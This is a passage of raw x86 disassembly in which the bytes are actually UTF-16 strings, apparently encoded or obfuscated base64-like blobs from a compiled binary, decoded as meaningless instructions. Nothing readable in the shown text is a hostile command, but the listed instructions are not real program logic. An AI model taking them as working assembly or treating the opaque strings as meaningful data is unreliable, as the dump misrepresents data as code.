10004144:	00 48 00             	add    %cl,0x0(%eax)
10004147:	49                   	dec    %ecx
10004148:	00 3d 00 00 15 53    	add    %bh,0x53150000
1000414e:	00 47 00             	add    %al,0x0(%edi)
10004151:	50                   	push   %eax
10004152:	00 69 00             	add    %ch,0x0(%ecx)
10004155:	69 00 66 00 73 00    	imul   $0x730066,(%eax),%eax
1000415b:	43                   	inc    %ebx
1000415c:	00 4c 00 72          	add    %cl,0x72(%eax,%eax,1)
10004160:	00 00                	add    %al,(%eax)
10004162:	79 59                	jns    0x100041bd
10004164:	00 54 00 5a          	add    %dl,0x5a(%eax,%eax,1)
10004168:	00 35 00 62 00 57    	add    %dh,0x57006200
1000416e:	00 68 00             	add    %ch,0x0(%eax)
10004171:	44                   	inc    %esp
10004172:	00 4f 00             	add    %cl,0x0(%edi)
10004175:	54                   	push   %esp
10004176:	00 49 00             	add    %cl,0x0(%ecx)
10004179:	30 00                	xor    %al,(%eax)
1000417b:	62 00                	bound  %eax,(%eax)
1000417d:	31 00                	xor    %eax,(%eax)
1000417f:	6b 00 7a             	imul   $0x7a,(%eax),%eax
10004182:	00 54 00 6d          	add    %dl,0x6d(%eax,%eax,1)
10004186:	00 45 00             	add    %al,0x0(%ebp)
10004189:	32 00                	xor    (%eax),%al
1000418b:	65 00 57 00          	add    %dl,%gs:0x0(%edi)
1000418f:	31 00                	xor    %eax,(%eax)
10004191:	6f                   	outsl  %ds:(%esi),(%dx)
10004192:	00 51 00             	add    %dl,0x0(%ecx)
10004195:	7a 00                	jp     0x10004197
10004197:	6b 00 79             	imul   $0x79,(%eax),%eax
1000419a:	00 4e 00             	add    %cl,0x0(%esi)
1000419d:	47                   	inc    %edi
1000419e:	00 39                	add    %bh,(%ecx)
100041a0:	00 68 00             	add    %ch,0x0(%eax)
100041a3:	4e                   	dec    %esi
100041a4:	00 6e 00             	add    %ch,0x0(%esi)
100041a7:	6c                   	insb   (%dx),%es:(%edi)
100041a8:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
100041ac:	00 45 00             	add    %al,0x0(%ebp)
100041af:	4d                   	dec    %ebp
100041b0:	00 35 00 4d 00 6a    	add    %dh,0x6a004d00
100041b6:	00 52 00             	add    %dl,0x0(%edx)
100041b9:	76 00                	jbe    0x100041bb
100041bb:	61                   	popa
100041bc:	00 6d 00             	add    %ch,0x0(%ebp)
100041bf:	45                   	inc    %ebp
100041c0:	00 32                	add    %dh,(%edx)
100041c2:	00 65 00             	add    %ah,0x0(%ebp)
100041c5:	57                   	push   %edi
100041c6:	00 31                	add    %dh,(%ecx)
100041c8:	00 6f 00             	add    %ch,0x0(%edi)
100041cb:	51                   	push   %ecx
100041cc:	00 7a 00             	add    %bh,0x0(%edx)
100041cf:	6b 00 79             	imul   $0x79,(%eax),%eax
100041d2:	00 4e 00             	add    %cl,0x0(%esi)
100041d5:	47                   	inc    %edi
100041d6:	00 38                	add    %bh,(%eax)
100041d8:	00 3d 00 00 15 61    	add    %bh,0x61150000
100041de:	00 36                	add    %dh,(%esi)
100041e0:	00 79 00             	add    %bh,0x0(%ecx)
100041e3:	6d                   	insl   (%dx),%es:(%edi)
100041e4:	00 68 00             	add    %ch,0x0(%eax)
100041e7:	43                   	inc    %ebx
100041e8:	00 39                	add    %bh,(%ecx)
100041ea:	00 32                	add    %dh,(%edx)
100041ec:	00 34 00             	add    %dh,(%eax,%eax,1)
100041ef:	6f                   	outsl  %ds:(%esi),(%dx)
100041f0:	00 00                	add    %al,(%eax)
100041f2:	81 71 54 00 57 00 4a 	xorl   $0x4a005700,0x54(%ecx)
100041f9:	00 55 00             	add    %dl,0x0(%ebp)
100041fc:	4d                   	dec    %ebp
100041fd:	00 45 00             	add    %al,0x0(%ebp)
10004200:	46                   	inc    %esi
10004201:	00 53 00             	add    %dl,0x0(%ebx)
10004204:	64 00 56 00          	add    %dl,%fs:0x0(%esi)
10004208:	64 00 45 00          	add    %al,%fs:0x0(%ebp)
1000420c:	5a                   	pop    %edx
1000420d:	00 31                	add    %dh,(%ecx)
1000420f:	00 4e 00             	add    %cl,0x0(%esi)
10004212:	58                   	pop    %eax
10004213:	00 4e 00             	add    %cl,0x0(%esi)
10004216:	55                   	push   %ebp
10004217:	00 31                	add    %dh,(%ecx)
10004219:	00 69 00             	add    %ch,0x0(%ecx)
1000421c:	56                   	push   %esi
1000421d:	00 44 00 42          	add    %al,0x42(%eax,%eax,1)
10004221:	00 42 00             	add    %al,0x0(%edx)
10004224:	55                   	push   %ebp
10004225:	00 6e 00             	add    %ch,0x0(%esi)
10004228:	56                   	push   %esi
10004229:	00 58 00             	add    %bl,0x0(%eax)
1000422c:	52                   	push   %edx
1000422d:	00 47 00             	add    %al,0x0(%edi)
10004230:	64 00 4e 00          	add    %cl,%fs:0x0(%esi)
10004234:	59                   	pop    %ecx
10004235:	00 6c 00 51          	add    %ch,0x51(%eax,%eax,1)
10004239:	00 77 00             	add    %dh,0x0(%edi)
1000423c:	51                   	push   %ecx
1000423d:	00 56 00             	add    %dl,0x0(%esi)
10004240:	4a                   	dec    %edx
10004241:	00 31                	add    %dh,(%ecx)
10004243:	00 56 00             	add    %dl,0x0(%esi)
10004246:	30 00                	xor    %al,(%eax)
10004248:	52                   	push   %edx
10004249:	00 6e 00             	add    %ch,0x0(%esi)
1000424c:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
10004250:	52                   	push   %edx
10004251:	00 48 00             	add    %cl,0x0(%eax)
10004254:	54                   	push   %esp
10004255:	00 57 00             	add    %dl,0x0(%edi)
10004258:	4a                   	dec    %edx
10004259:	00 55 00             	add    %dl,0x0(%ebp)
1000425c:	4d                   	dec    %ebp
1000425d:	00 45 00             	add    %al,0x0(%ebp)
10004260:	46                   	inc    %esi
10004261:	00 53 00             	add    %dl,0x0(%ebx)
10004264:	64 00 56 00          	add    %dl,%fs:0x0(%esi)
10004268:	64 00 45 00          	add    %al,%fs:0x0(%ebp)
1000426c:	5a                   	pop    %edx
1000426d:	00 30                	add    %dh,(%eax)
1000426f:	00 31                	add    %dh,(%ecx)
10004271:	00 69 00             	add    %ch,0x0(%ecx)
10004274:	56                   	push   %esi
10004275:	00 44 00 42          	add    %al,0x42(%eax,%eax,1)
10004279:	00 42 00             	add    %al,0x0(%edx)
1000427c:	55                   	push   %ebp
1000427d:	00 6e 00             	add    %ch,0x0(%esi)
10004280:	56                   	push   %esi
10004281:	00 58 00             	add    %bl,0x0(%eax)
10004284:	52                   	push   %edx
10004285:	00 47 00             	add    %al,0x0(%edi)
10004288:	64 00 47 00          	add    %al,%fs:0x0(%edi)
1000428c:	63 00                	arpl   %eax,(%eax)
1000428e:	32 00                	xor    (%eax),%al
10004290:	4a                   	dec    %edx
10004291:	00 4e 00             	add    %cl,0x0(%esi)
10004294:	59                   	pop    %ecx
10004295:	00 6c 00 51          	add    %ch,0x51(%eax,%eax,1)
10004299:	00 77 00             	add    %dh,0x0(%edi)
1000429c:	51                   	push   %ecx
1000429d:	00 56 00             	add    %dl,0x0(%esi)
100042a0:	4a                   	dec    %edx
100042a1:	00 31                	add    %dh,(%ecx)
100042a3:	00 56 00             	add    %dl,0x0(%esi)
100042a6:	30 00                	xor    %al,(%eax)
100042a8:	52                   	push   %edx
100042a9:	00 6e 00             	add    %ch,0x0(%esi)
100042ac:	54                   	push   %esp
100042ad:	00 57 00             	add    %dl,0x0(%edi)
100042b0:	4a                   	dec    %edx
100042b1:	00 55 00             	add    %dl,0x0(%ebp)
100042b4:	4d                   	dec    %ebp
100042b5:	00 45 00             	add    %al,0x0(%ebp)
100042b8:	46                   	inc    %esi
100042b9:	00 53 00             	add    %dl,0x0(%ebx)
100042bc:	64 00 56 00          	add    %dl,%fs:0x0(%esi)
100042c0:	64 00 45 00          	add    %al,%fs:0x0(%ebp)
100042c4:	5a                   	pop    %edx
100042c5:	00 30                	add    %dh,(%eax)
100042c7:	00 5a 00             	add    %bl,0x0(%edx)
100042ca:	57                   	push   %edi
100042cb:	00 4d 00             	add    %cl,0x0(%ebp)
100042ce:	45                   	inc    %ebp
100042cf:	00 31                	add    %dh,(%ecx)
100042d1:	00 69 00             	add    %ch,0x0(%ecx)
100042d4:	56                   	push   %esi
100042d5:	00 44 00 42          	add    %al,0x42(%eax,%eax,1)
100042d9:	00 42 00             	add    %al,0x0(%edx)
100042dc:	55                   	push   %ebp
100042dd:	00 6e 00             	add    %ch,0x0(%esi)
100042e0:	56                   	push   %esi
100042e1:	00 58 00             	add    %bl,0x0(%eax)
100042e4:	52                   	push   %edx
100042e5:	00 47 00             	add    %al,0x0(%edi)
100042e8:	64 00 4e 00          	add    %cl,%fs:0x0(%esi)
100042ec:	59                   	pop    %ecx
100042ed:	00 6c 00 51          	add    %ch,0x51(%eax,%eax,1)
100042f1:	00 77 00             	add    %dh,0x0(%edi)
100042f4:	51                   	push   %ecx
100042f5:	00 56 00             	add    %dl,0x0(%esi)
100042f8:	4a                   	dec    %edx
100042f9:	00 31                	add    %dh,(%ecx)
100042fb:	00 56 00             	add    %dl,0x0(%esi)
100042fe:	30 00                	xor    %al,(%eax)
10004300:	52                   	push   %edx
10004301:	00 6e 00             	add    %ch,0x0(%esi)
10004304:	59                   	pop    %ecx
10004305:	00 56 00             	add    %dl,0x0(%esi)
10004308:	64 00 33             	add    %dh,%fs:(%ebx)
1000430b:	00 54 00 57          	add    %dl,0x57(%eax,%eax,1)
1000430f:	00 4a 00             	add    %cl,0x0(%edx)
10004312:	55                   	push   %ebp
10004313:	00 4d 00             	add    %cl,0x0(%ebp)
10004316:	45                   	inc    %ebp
10004317:	00 46 00             	add    %al,0x0(%esi)
1000431a:	53                   	push   %ebx
1000431b:	00 64 00 56          	add    %ah,0x56(%eax,%eax,1)
1000431f:	00 64 00 45          	add    %ah,0x45(%eax,%eax,1)
10004323:	00 5a 00             	add    %bl,0x0(%edx)
10004326:	30 00                	xor    %al,(%eax)
10004328:	31 00                	xor    %eax,(%eax)
1000432a:	69 00 56 00 44 00    	imul   $0x440056,(%eax),%eax
10004330:	42                   	inc    %edx
10004331:	00 42 00             	add    %al,0x0(%edx)
10004334:	55                   	push   %ebp
10004335:	00 6e 00             	add    %ch,0x0(%esi)
10004338:	56                   	push   %esi
10004339:	00 58 00             	add    %bl,0x0(%eax)
1000433c:	52                   	push   %edx
1000433d:	00 47 00             	add    %al,0x0(%edi)
10004340:	63 00                	arpl   %eax,(%eax)
10004342:	39 00                	cmp    %eax,(%eax)
10004344:	54                   	push   %esp
10004345:	00 57 00             	add    %dl,0x0(%edi)
10004348:	4a                   	dec    %edx
10004349:	00 55 00             	add    %dl,0x0(%ebp)
1000434c:	4d                   	dec    %ebp
1000434d:	00 45 00             	add    %al,0x0(%ebp)
10004350:	46                   	inc    %esi
10004351:	00 53 00             	add    %dl,0x0(%ebx)
10004354:	64 00 56 00          	add    %dl,%fs:0x0(%esi)
10004358:	64 00 45 00          	add    %al,%fs:0x0(%ebp)
1000435c:	5a                   	pop    %edx
1000435d:	00 77 00             	add    %dh,0x0(%edi)
10004360:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
10004365:	15 4d 00 62 00       	adc    $0x62004d,%eax
1000436a:	54                   	push   %esp
1000436b:	00 30                	add    %dh,(%eax)
1000436d:	00 41 00             	add    %al,0x0(%ecx)
10004370:	52                   	push   %edx
10004371:	00 75 00             	add    %dh,0x0(%ebp)
10004374:	57                   	push   %edi
10004375:	00 44 00 67          	add    %al,0x67(%eax,%eax,1)
10004379:	00 00                	add    %al,(%eax)
1000437b:	80 f9 61             	cmp    $0x61,%cl
1000437e:	00 32                	add    %dh,(%edx)
10004380:	00 68 00             	add    %ch,0x0(%eax)
10004383:	50                   	push   %eax
10004384:	00 57 00             	add    %dl,0x0(%edi)
10004387:	6b 00 6c             	imul   $0x6c,(%eax),%eax
1000438a:	00 6c 00 63          	add    %ch,0x63(%eax,%eax,1)
1000438e:	00 32                	add    %dh,(%edx)
10004390:	00 35 00 49 00 63    	add    %dh,0x63004900
10004396:	00 57 00             	add    %dl,0x0(%edi)
10004399:	4a                   	dec    %edx
1000439a:	00 74 00 5a          	add    %dh,0x5a(%eax,%eax,1)
1000439e:	00 47 00             	add    %al,0x0(%edi)
100043a1:	74 00                	je     0x100043a3
100043a3:	6f                   	outsl  %ds:(%esi),(%dx)
100043a4:	00 54 00 31          	add    %dl,0x31(%eax,%eax,1)
100043a8:	00 70 00             	add    %dh,0x0(%eax)
100043ab:	4a                   	dec    %edx
100043ac:	00 5a 00             	add    %bl,0x0(%edx)
100043af:	58                   	pop    %eax
100043b0:	00 4e 00             	add    %cl,0x0(%esi)
100043b3:	75 00                	jne    0x100043b5
100043b5:	53                   	push   %ebx
100043b6:	00 48 00             	add    %cl,0x0(%eax)
100043b9:	46                   	inc    %esi
100043ba:	00 72 00             	add    %dh,0x0(%edx)
100043bd:	61                   	popa
100043be:	00 45 00             	add    %al,0x0(%ebp)
100043c1:	39 00                	cmp    %eax,(%eax)
100043c3:	61                   	popa
100043c4:	00 53 00             	add    %dl,0x0(%ebx)
100043c7:	57                   	push   %edi
100043c8:	00 56 00             	add    %dl,0x0(%esi)
100043cb:	7a 00                	jp     0x100043cd
100043cd:	62 00                	bound  %eax,(%eax)
100043cf:	6b 00 68             	imul   $0x68,(%eax),%eax
100043d2:	00 78 00             	add    %bh,0x0(%eax)
100043d5:	62 00                	bound  %eax,(%eax)
100043d7:	47                   	inc    %edi
100043d8:	00 4a 00             	add    %cl,0x0(%edx)
100043db:	75 00                	jne    0x100043dd
100043dd:	61                   	popa
100043de:	00 32                	add    %dh,(%edx)
100043e0:	00 68 00             	add    %ch,0x0(%eax)
100043e3:	50                   	push   %eax
100043e4:	00 57 00             	add    %dl,0x0(%edi)
100043e7:	6b 00 6c             	imul   $0x6c,(%eax),%eax
100043ea:	00 6c 00 63          	add    %ch,0x63(%eax,%eax,1)
100043ee:	00 32                	add    %dh,(%edx)
100043f0:	00 35 00 49 00 63    	add    %dh,0x63004900
100043f6:	00 57 00             	add    %dl,0x0(%edi)
100043f9:	74 00                	je     0x100043fb
100043fb:	6f                   	outsl  %ds:(%esi),(%dx)
100043fc:	00 54 00 31          	add    %dl,0x31(%eax,%eax,1)
10004400:	00 70 00             	add    %dh,0x0(%eax)
10004403:	4a                   	dec    %edx
10004404:	00 5a 00             	add    %bl,0x0(%edx)
10004407:	58                   	pop    %eax
10004408:	00 4e 00             	add    %cl,0x0(%esi)
1000440b:	75 00                	jne    0x1000440d
1000440d:	53                   	push   %ebx
1000440e:	00 48 00             	add    %cl,0x0(%eax)
10004411:	46                   	inc    %esi
10004412:	00 53 00             	add    %dl,0x0(%ebx)
10004415:	61                   	popa
10004416:	00 47 00             	add    %al,0x0(%edi)
10004419:	4e                   	dec    %esi
1000441a:	00 72 00             	add    %dh,0x0(%edx)
1000441d:	61                   	popa
1000441e:	00 45 00             	add    %al,0x0(%ebp)
10004421:	39 00                	cmp    %eax,(%eax)
10004423:	61                   	popa
10004424:	00 53 00             	add    %dl,0x0(%ebx)
10004427:	57                   	push   %edi
10004428:	00 56 00             	add    %dl,0x0(%esi)
1000442b:	7a 00                	jp     0x1000442d
1000442d:	62 00                	bound  %eax,(%eax)
1000442f:	6b 00 68             	imul   $0x68,(%eax),%eax
10004432:	00 78 00             	add    %bh,0x0(%eax)
10004435:	61                   	popa
10004436:	00 32                	add    %dh,(%edx)
10004438:	00 68 00             	add    %ch,0x0(%eax)
1000443b:	50                   	push   %eax
1000443c:	00 57 00             	add    %dl,0x0(%edi)
1000443f:	6b 00 6c             	imul   $0x6c,(%eax),%eax
10004442:	00 6c 00 63          	add    %ch,0x63(%eax,%eax,1)
10004446:	00 32                	add    %dh,(%edx)
10004448:	00 35 00 49 00 63    	add    %dh,0x63004900
1000444e:	00 54 00 4a          	add    %dl,0x4a(%eax,%eax,1)
10004452:	00 7a 00             	add    %bh,0x0(%edx)
10004455:	50                   	push   %eax
10004456:	00 57 00             	add    %dl,0x0(%edi)
10004459:	74 00                	je     0x1000445b
1000445b:	6f                   	outsl  %ds:(%esi),(%dx)
1000445c:	00 54 00 31          	add    %dl,0x31(%eax,%eax,1)
10004460:	00 70 00             	add    %dh,0x0(%eax)
10004463:	4a                   	dec    %edx
10004464:	00 5a 00             	add    %bl,0x0(%edx)
10004467:	58                   	pop    %eax
10004468:	00 4e 00             	add    %cl,0x0(%esi)
1000446b:	75 00                	jne    0x1000446d
1000446d:	53                   	push   %ebx
1000446e:	00 48 00             	add    %cl,0x0(%eax)
10004471:	45                   	inc    %ebp
10004472:	00 3d 00 00 15 6b    	add    %bh,0x6b150000
10004478:	00 68 00             	add    %ch,0x0(%eax)
1000447b:	4f                   	dec    %edi
1000447c:	00 5a 00             	add    %bl,0x0(%edx)
1000447f:	49                   	dec    %ecx
10004480:	00 65 00             	add    %ah,0x0(%ebp)
10004483:	73 00                	jae    0x10004485
10004485:	6e                   	outsb  %ds:(%esi),(%dx)
10004486:	00 48 00             	add    %cl,0x0(%eax)
10004489:	71 00                	jno    0x1000448b
1000448b:	00 85 81 51 00 6d    	add    %al,0x6d005181(%ebp)
10004491:	00 74 00 6a          	add    %dh,0x6a(%eax,%eax,1)
10004495:	00 5a 00             	add    %bl,0x0(%edx)
10004498:	56                   	push   %esi
10004499:	00 68 00             	add    %ch,0x0(%eax)
1000449c:	77 00                	ja     0x1000449e
1000449e:	4f                   	dec    %edi
1000449f:	00 46 00             	add    %al,0x0(%esi)
100044a2:	4a                   	dec    %edx
100044a3:	00 74 00 4d          	add    %dh,0x4d(%eax,%eax,1)
100044a7:	00 46 00             	add    %al,0x0(%esi)
100044aa:	46                   	inc    %esi
100044ab:	00 36                	add    %dh,(%esi)
100044ad:	00 63 00             	add    %ah,0x0(%ebx)
100044b0:	45                   	inc    %ebp
100044b1:	00 4a 00             	add    %cl,0x0(%edx)
100044b4:	72 00                	jb     0x100044b6
100044b6:	59                   	pop    %ecx
100044b7:	00 32                	add    %dh,(%edx)
100044b9:	00 56 00             	add    %dl,0x0(%esi)
100044bc:	59                   	pop    %ecx
100044bd:	00 63 00             	add    %ah,0x0(%ebx)
100044c0:	44                   	inc    %esp
100044c1:	00 68 00             	add    %ch,0x0(%eax)
100044c4:	53                   	push   %ebx
100044c5:	00 62 00             	add    %ah,0x0(%edx)
100044c8:	54                   	push   %esp
100044c9:	00 42 00             	add    %al,0x0(%edx)
100044cc:	43                   	inc    %ebx
100044cd:	00 61 00             	add    %ah,0x0(%ecx)
100044d0:	32 00                	xor    (%eax),%al
100044d2:	4e                   	dec    %esi
100044d3:	00 6c 00 57          	add    %ch,0x57(%eax,%eax,1)
100044d7:	00 48 00             	add    %cl,0x0(%eax)
100044da:	41                   	inc    %ecx
100044db:	00 34 00             	add    %dh,(%eax,%eax,1)
100044de:	55                   	push   %ebp
100044df:	00 6d 00             	add    %ch,0x0(%ebp)
100044e2:	30 00                	xor    %al,(%eax)
100044e4:	77 00                	ja     0x100044e6
100044e6:	59                   	pop    %ecx
100044e7:	00 31                	add    %dh,(%ecx)
100044e9:	00 68 00             	add    %ch,0x0(%eax)
100044ec:	47                   	inc    %edi
100044ed:	00 51 00             	add    %dl,0x0(%ecx)
100044f0:	6d                   	insl   (%dx),%es:(%edi)
100044f1:	00 74 00 6a          	add    %dh,0x6a(%eax,%eax,1)
100044f5:	00 5a 00             	add    %bl,0x0(%edx)
100044f8:	56                   	push   %esi
100044f9:	00 68 00             	add    %ch,0x0(%eax)
100044fc:	77 00                	ja     0x100044fe
100044fe:	4f                   	dec    %edi
100044ff:	00 46 00             	add    %al,0x0(%esi)
10004502:	4a                   	dec    %edx
10004503:	00 74 00 4d          	add    %dh,0x4d(%eax,%eax,1)
10004507:	00 45 00             	add    %al,0x0(%ebp)
1000450a:	4a                   	dec    %edx
1000450b:	00 72 00             	add    %dh,0x0(%edx)
1000450e:	59                   	pop    %ecx
1000450f:	00 32                	add    %dh,(%edx)
10004511:	00 56 00             	add    %dl,0x0(%esi)
10004514:	59                   	pop    %ecx
10004515:	00 63 00             	add    %ah,0x0(%ebx)
10004518:	44                   	inc    %esp
10004519:	00 68 00             	add    %ch,0x0(%eax)
1000451c:	53                   	push   %ebx
1000451d:	00 62 00             	add    %ah,0x0(%edx)
10004520:	54                   	push   %esp
10004521:	00 42 00             	add    %al,0x0(%edx)
10004524:	6b 00 63             	imul   $0x63,(%eax),%eax
10004527:	00 47 00             	add    %al,0x0(%edi)
1000452a:	4a                   	dec    %edx
1000452b:	00 43 00             	add    %al,0x0(%ebx)
1000452e:	61                   	popa
1000452f:	00 32                	add    %dh,(%edx)
10004531:	00 4e 00             	add    %cl,0x0(%esi)
10004534:	6c                   	insb   (%dx),%es:(%edi)
10004535:	00 57 00             	add    %dl,0x0(%edi)
10004538:	48                   	dec    %eax
10004539:	00 41 00             	add    %al,0x0(%ecx)
1000453c:	34 00                	xor    $0x0,%al
1000453e:	55                   	push   %ebp
1000453f:	00 6d 00             	add    %ch,0x0(%ebp)
10004542:	30 00                	xor    %al,(%eax)
10004544:	77 00                	ja     0x10004546
10004546:	51                   	push   %ecx
10004547:	00 6d 00             	add    %ch,0x0(%ebp)
1000454a:	74 00                	je     0x1000454c
1000454c:	6a 00                	push   $0x0
1000454e:	5a                   	pop    %edx
1000454f:	00 56 00             	add    %dl,0x0(%esi)
10004552:	68 00 77 00 4f       	push   $0x4f007700
10004557:	00 46 00             	add    %al,0x0(%esi)
1000455a:	4a                   	dec    %edx
1000455b:	00 74 00 4d          	add    %dh,0x4d(%eax,%eax,1)
1000455f:	00 47 00             	add    %al,0x0(%edi)
10004562:	31 00                	xor    %eax,(%eax)
10004564:	53                   	push   %ebx
10004565:	00 64 00 6b          	add    %ah,0x6b(%eax,%eax,1)
10004569:	00 4a 00             	add    %cl,0x0(%edx)
1000456c:	72 00                	jb     0x1000456e
1000456e:	59                   	pop    %ecx
1000456f:	00 32                	add    %dh,(%edx)
10004571:	00 56 00             	add    %dl,0x0(%esi)
10004574:	59                   	pop    %ecx
10004575:	00 63 00             	add    %ah,0x0(%ebx)
10004578:	44                   	inc    %esp
10004579:	00 68 00             	add    %ch,0x0(%eax)
1000457c:	53                   	push   %ebx
1000457d:	00 62 00             	add    %ah,0x0(%edx)
10004580:	54                   	push   %esp
10004581:	00 42 00             	add    %al,0x0(%edx)
10004584:	43                   	inc    %ebx
10004585:	00 61 00             	add    %ah,0x0(%ecx)
10004588:	32 00                	xor    (%eax),%al
1000458a:	4e                   	dec    %esi
1000458b:	00 6c 00 57          	add    %ch,0x57(%eax,%eax,1)
1000458f:	00 48 00             	add    %cl,0x0(%eax)
10004592:	41                   	inc    %ecx
10004593:	00 34 00             	add    %dh,(%eax,%eax,1)
10004596:	55                   	push   %ebp
10004597:	00 6d 00             	add    %ch,0x0(%ebp)
1000459a:	30 00                	xor    %al,(%eax)
1000459c:	77 00                	ja     0x1000459e
1000459e:	5a                   	pop    %edx
1000459f:	00 44 00 4e          	add    %al,0x4e(%eax,%eax,1)
100045a3:	00 4f 00             	add    %cl,0x0(%edi)
100045a6:	51                   	push   %ecx
100045a7:	00 6d 00             	add    %ch,0x0(%ebp)
100045aa:	74 00                	je     0x100045ac
100045ac:	6a 00                	push   $0x0
100045ae:	5a                   	pop    %edx
100045af:	00 56 00             	add    %dl,0x0(%esi)
100045b2:	68 00 77 00 4f       	push   $0x4f007700
100045b7:	00 46 00             	add    %al,0x0(%esi)
100045ba:	4a                   	dec    %edx
100045bb:	00 74 00 4d          	add    %dh,0x4d(%eax,%eax,1)
100045bf:	00 45 00             	add    %al,0x0(%ebp)
100045c2:	4a                   	dec    %edx
100045c3:	00 72 00             	add    %dh,0x0(%edx)
100045c6:	59                   	pop    %ecx
100045c7:	00 32                	add    %dh,(%edx)
100045c9:	00 56 00             	add    %dl,0x0(%esi)
100045cc:	59                   	pop    %ecx
100045cd:	00 63 00             	add    %ah,0x0(%ebx)
100045d0:	44                   	inc    %esp
100045d1:	00 68 00             	add    %ch,0x0(%eax)
100045d4:	53                   	push   %ebx
100045d5:	00 62 00             	add    %ah,0x0(%edx)
100045d8:	54                   	push   %esp
100045d9:	00 42 00             	add    %al,0x0(%edx)
100045dc:	6a 00                	push   $0x0
100045de:	57                   	push   %edi
100045df:	00 45 00             	add    %al,0x0(%ebp)
100045e2:	56                   	push   %esi
100045e3:	00 43 00             	add    %al,0x0(%ebx)
100045e6:	61                   	popa
100045e7:	00 32                	add    %dh,(%edx)
100045e9:	00 4e 00             	add    %cl,0x0(%esi)
100045ec:	6c                   	insb   (%dx),%es:(%edi)
100045ed:	00 57 00             	add    %dl,0x0(%edi)
100045f0:	48                   	dec    %eax
100045f1:	00 41 00             	add    %al,0x0(%ecx)
100045f4:	34 00                	xor    $0x0,%al
100045f6:	55                   	push   %ebp
100045f7:	00 6d 00             	add    %ch,0x0(%ebp)
100045fa:	30 00                	xor    %al,(%eax)
100045fc:	77 00                	ja     0x100045fe
100045fe:	51                   	push   %ecx
100045ff:	00 6d 00             	add    %ch,0x0(%ebp)
10004602:	74 00                	je     0x10004604
10004604:	6a 00                	push   $0x0
10004606:	5a                   	pop    %edx
10004607:	00 56 00             	add    %dl,0x0(%esi)
1000460a:	68 00 77 00 4f       	push   $0x4f007700
1000460f:	00 46 00             	add    %al,0x0(%esi)
10004612:	4a                   	dec    %edx
10004613:	00 74 00 4d          	add    %dh,0x4d(%eax,%eax,1)
10004617:	00 44 00 46          	add    %al,0x46(%eax,%eax,1)
1000461b:	00 77 00             	add    %dh,0x0(%edi)
1000461e:	57                   	push   %edi
1000461f:	00 55 00             	add    %dl,0x0(%ebp)
10004622:	4a                   	dec    %edx
10004623:	00 72 00             	add    %dh,0x0(%edx)
10004626:	59                   	pop    %ecx
10004627:	00 32                	add    %dh,(%edx)
10004629:	00 56 00             	add    %dl,0x0(%esi)
1000462c:	59                   	pop    %ecx
1000462d:	00 63 00             	add    %ah,0x0(%ebx)
10004630:	44                   	inc    %esp
10004631:	00 68 00             	add    %ch,0x0(%eax)
10004634:	53                   	push   %ebx
10004635:	00 62 00             	add    %ah,0x0(%edx)
10004638:	54                   	push   %esp
10004639:	00 42 00             	add    %al,0x0(%edx)
1000463c:	43                   	inc    %ebx
1000463d:	00 61 00             	add    %ah,0x0(%ecx)
10004640:	32 00                	xor    (%eax),%al
10004642:	4e                   	dec    %esi
10004643:	00 6c 00 57          	add    %ch,0x57(%eax,%eax,1)
10004647:	00 48 00             	add    %cl,0x0(%eax)
1000464a:	41                   	inc    %ecx
1000464b:	00 34 00             	add    %dh,(%eax,%eax,1)
1000464e:	55                   	push   %ebp
1000464f:	00 6d 00             	add    %ch,0x0(%ebp)
10004652:	30 00                	xor    %al,(%eax)
10004654:	77 00                	ja     0x10004656
10004656:	4d                   	dec    %ebp
10004657:	00 30                	add    %dh,(%eax)
10004659:	00 70 00             	add    %dh,0x0(%eax)
1000465c:	32 00                	xor    (%eax),%al
1000465e:	51                   	push   %ecx
1000465f:	00 6d 00             	add    %ch,0x0(%ebp)
10004662:	74 00                	je     0x10004664
10004664:	6a 00                	push   $0x0
10004666:	5a                   	pop    %edx
10004667:	00 56 00             	add    %dl,0x0(%esi)
1000466a:	68 00 77 00 4f       	push   $0x4f007700
1000466f:	00 46 00             	add    %al,0x0(%esi)
10004672:	4a                   	dec    %edx
10004673:	00 74 00 4d          	add    %dh,0x4d(%eax,%eax,1)
10004677:	00 45 00             	add    %al,0x0(%ebp)
1000467a:	4a                   	dec    %edx
1000467b:	00 72 00             	add    %dh,0x0(%edx)
1000467e:	59                   	pop    %ecx
1000467f:	00 32                	add    %dh,(%edx)
10004681:	00 56 00             	add    %dl,0x0(%esi)
10004684:	59                   	pop    %ecx
10004685:	00 63 00             	add    %ah,0x0(%ebx)
10004688:	44                   	inc    %esp
10004689:	00 68 00             	add    %ch,0x0(%eax)
1000468c:	53                   	push   %ebx
1000468d:	00 62 00             	add    %ah,0x0(%edx)
10004690:	54                   	push   %esp
10004691:	00 42 00             	add    %al,0x0(%edx)
10004694:	6a 00                	push   $0x0
10004696:	4d                   	dec    %ebp
10004697:	00 6a 00             	add    %ch,0x0(%edx)
1000469a:	6c                   	insb   (%dx),%es:(%edi)
1000469b:	00 43 00             	add    %al,0x0(%ebx)
1000469e:	61                   	popa
1000469f:	00 32                	add    %dh,(%edx)
100046a1:	00 4e 00             	add    %cl,0x0(%esi)
100046a4:	6c                   	insb   (%dx),%es:(%edi)
100046a5:	00 57 00             	add    %dl,0x0(%edi)
100046a8:	48                   	dec    %eax
100046a9:	00 41 00             	add    %al,0x0(%ecx)
100046ac:	34 00                	xor    $0x0,%al
100046ae:	55                   	push   %ebp
100046af:	00 6d 00             	add    %ch,0x0(%ebp)
100046b2:	30 00                	xor    %al,(%eax)
100046b4:	77 00                	ja     0x100046b6
100046b6:	51                   	push   %ecx
100046b7:	00 6d 00             	add    %ch,0x0(%ebp)
100046ba:	74 00                	je     0x100046bc
100046bc:	6a 00                	push   $0x0
100046be:	5a                   	pop    %edx
100046bf:	00 56 00             	add    %dl,0x0(%esi)
100046c2:	68 00 77 00 4f       	push   $0x4f007700
100046c7:	00 46 00             	add    %al,0x0(%esi)
100046ca:	4a                   	dec    %edx
100046cb:	00 74 00 4d          	add    %dh,0x4d(%eax,%eax,1)
100046cf:	00 47 00             	add    %al,0x0(%edi)
100046d2:	31 00                	xor    %eax,(%eax)
100046d4:	6b 00 51             	imul   $0x51,(%eax),%eax
100046d7:	00 30                	add    %dh,(%eax)
100046d9:	00 4a 00             	add    %cl,0x0(%edx)
100046dc:	72 00                	jb     0x100046de
100046de:	59                   	pop    %ecx
100046df:	00 32                	add    %dh,(%edx)
100046e1:	00 56 00             	add    %dl,0x0(%esi)
